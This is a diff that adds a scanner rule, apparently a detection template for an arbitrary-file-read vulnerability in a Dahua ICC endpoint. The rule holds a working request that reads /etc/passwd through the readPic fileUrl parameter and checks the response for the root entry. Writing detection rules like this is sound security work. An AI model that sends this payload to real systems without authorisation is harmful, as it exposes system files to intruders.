@@ -1,0 +1,7 @@
+cve-id: dahua-icc-readpic-anyfileread
+rules:
+- method: GET
+  path: /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/passwd
+  expression: response.body.bcontains(b":root:/root:")
+severity: high
+type: anyfileread
